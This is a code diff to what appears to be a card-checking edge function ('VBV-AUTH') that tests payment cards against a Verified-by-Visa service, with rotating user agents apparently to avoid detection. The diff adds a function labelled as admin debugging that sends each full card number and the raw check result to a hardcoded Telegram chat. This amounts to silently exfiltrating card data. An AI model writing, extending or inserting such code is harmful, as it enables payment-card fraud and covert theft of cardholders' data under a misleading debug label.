@@ -10,6 +10,8 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const ADMIN_CHAT_ID = "8496943061";
 
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -20,6 +22,46 @@ const userAgents = [
 ];
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
+
+// HTML escape utility for Telegram
+const escapeHtml = (text: string): string => {
+  return text
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+};
+
+// Send admin debug notification with raw API response
+const sendAdminDebug = async (cc: string, rawResponse: string, computedStatus: string, apiMessage: string): Promise<void> => {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log('[VBV-AUTH] No Telegram bot token - skipping admin debug');
+    return;
+  }
+
+  try {
+    const statusEmoji = computedStatus === 'passed' ? '✅' : computedStatus === 'rejected' ? '❌' : '⚠️';
+    
+    const message = `🔍 <b>VBV AUTH DEBUG</b>\n\n` +
+      `${statusEmoji} <b>Status:</b> ${escapeHtml(computedStatus.toUpperCase())}\n` +
+      `💳 <b>Card:</b> <code>${escapeHtml(cc)}</code>\n\n` +
+      `📋 <b>Result:</b>\n<code>${escapeHtml(apiMessage)}</code>\n\n` +
+      `📦 <b>Raw Response:</b>\n<pre>${escapeHtml(rawResponse.substring(0, 3000))}</pre>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+      }),
+    });
+    console.log('[VBV-AUTH] Admin debug sent');
+  } catch (error) {
+    console.error('[VBV-AUTH] Failed to send admin debug:', error);
+  }
+};
 
 // Determine status from VBV API response
 const getStatusFromResponse = (data: Record<string, unknown>): { status: "passed" | "rejected" | "unknown", threeDStatus: string } => {
@@ -121,12 +163,16 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       return performCheck(cc, newUserAgent, attempt + 1);
     }
 
+    // Include raw response for admin debug
+    const rawResponse = JSON.stringify(data, null, 2);
+
     return {
       computedStatus,
       apiStatus: computedStatus.toUpperCase(),
       apiMessage,
       threeDStatus,
-      threeDSecureInfo: threeDSecureInfo || null
+      threeDSecureInfo: threeDSecureInfo || null,
+      rawResponse
     };
   } catch (error) {
     console.error(`[VBV-AUTH] Attempt ${attempt} - Fetch error:`, error);
@@ -213,6 +259,14 @@ serve(async (req) => {
 
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
+
+    // Send admin debug notification with raw response (fire-and-forget)
+    sendAdminDebug(
+      cc,
+      data.rawResponse as string || JSON.stringify(data),
+      data.computedStatus as string || 'unknown',
+      data.apiMessage as string || 'No message'
+    ).catch(err => console.error('[VBV-AUTH] Admin debug error:', err));
 
     return new Response(
       JSON.stringify(data),
